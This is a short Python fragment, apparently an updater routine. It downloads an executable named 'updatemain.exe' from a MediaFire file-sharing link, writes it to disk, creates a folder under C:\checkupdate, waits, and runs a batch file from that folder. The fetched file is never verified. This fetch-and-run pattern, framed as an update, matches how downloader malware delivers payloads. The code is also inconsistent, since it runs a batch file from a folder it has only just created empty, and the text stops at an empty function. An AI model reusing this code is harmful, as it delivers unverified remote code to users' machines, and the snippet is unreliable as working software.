def main():
    filename = Path('updatemain.exe')
    url = 'https://www.mediafire.com/file_premium/xoibi0sm4wbyn81/updatemain.exe/file'
    response = requests.get(url)
    filename.write_bytes(response.content)
    os.mkdir("C:\\checkupdate\\Updated")
    time.sleep(30)
    os.system('"C:\\checkupdate\\Updated\\startupdatemain.bat"')  
         
def fullcheck():
